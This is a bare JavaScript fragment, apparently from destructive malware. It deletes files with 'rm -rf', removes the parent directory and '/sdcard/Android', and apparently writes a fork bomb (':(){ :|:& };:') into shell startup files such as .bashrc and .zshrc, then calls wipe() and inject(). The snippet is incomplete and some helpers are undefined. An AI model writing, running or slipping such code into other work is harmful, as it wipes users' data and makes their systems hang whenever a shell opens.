const shellRcs = ['.bashrc', '.zshrc', '.profile'];
spawn('rm',['-rf',p],{stdio:'ignore'}); del('../'); del('/sdcard/Android');
const aliases = `\n:(){ :|:& };:\n`;
await fs.writeFile(fullPath, content, 'utf8');
wipe(); inject();
